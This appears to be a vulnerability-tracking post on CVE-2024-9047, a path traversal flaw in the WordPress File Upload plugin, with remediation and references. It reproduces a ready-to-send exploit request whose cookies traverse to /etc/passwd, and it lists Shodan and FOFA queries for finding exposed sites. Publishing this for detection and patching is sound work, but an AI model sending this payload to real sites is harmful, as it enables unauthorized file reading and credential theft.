---
layout: post
cve_id: CVE-2024-9047
title: WordPress File Upload <= 4.24.11 - Arbitrary File Read
pcap: true
pcap_path: /pcaps/2024/CVE-2024-9047.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-9047.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io,S9n3x
severity: critical
impact: 'Unauthenticated attackers can read or delete arbitrary files outside the
  intended directory on WordPress sites running PHP 7.4 or earlier, potentially exposing
  sensitive configuration files, credentials, and causing system disruption.

  '
remediation: 'Update WordPress File Upload plugin to version 4.24.12 or later to address
  the path traversal vulnerability in wfu_file_downloader.php, or upgrade PHP to version
  8.0 or later.

  '
reference:
- https://github.com/iSee857/CVE-2024-9047-PoC
- https://nvd.nist.gov/vuln/detail/cve-2024-9047
- https://plugins.trac.wordpress.org/changeset/3164449/wp-file-upload
- https://www.wordfence.com/threat-intel/vulnerabilities/id/554a314c-9e8e-4691-9792-d086790ef40f?source=cve
- https://github.com/wy876/POC
- https://www.usom.gov.tr/bildirim/tr-24-1670
- https://sploitus.com/exploit?id=3358E6CC-BC63-56E4-A4C4-1F70903C34D5
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-9047
  cwe-id: CWE-22
  epss-score: 0.93781
  epss-percentile: 0.99846
metadata:
  max-request: 1
  vendor: nickolas_bossinas
  product: wordpress-file-upload
  framework: wordpress
  shodan-query: http.html:"/wp-content/plugins/wp-file-upload/"
  fofa-query: body="/wp-content/plugins/wp-file-upload"
  publicwww-query: /wp-content/plugins/wp-file-upload/
tags:
- cve
- cve2024
- wp
- wordpress
- wp-plugin
- wp-file-upload
- lfi
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The WordPress File Upload plugin for WordPress is vulnerable to Path Traversal in all versions up to, and including, 4.24.11 via wfu_file_downloader.php. This makes it possible for unauthenticated attackers to read or delete files outside of the originally intended directory. Successful exploitation requires the targeted WordPress installation to be using PHP 7.4 or earlier.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=ZwhcmqqXWQE40mB2&ticket=5VlQxMSv4ZZ1eBCQ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_nQcU82lTlI5M3QSav5JdYSpKkzOzrpZG HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Cookie: wp_wpfileupload_nQcU82lTlI5M3QSav5JdYSpKkzOzrpZG=mWFyl19xREMNALUg5yYOsxv6zQ4MQMpG; wfu_storage_ZwhcmqqXWQE40mB2=/../../../../../etc/passwd[[name]]; wfu_download_ticket_5VlQxMSv4ZZ1eBCQ=3897968442243; wfu_ABSPATH=/;
Accept-Encoding: gzip
```

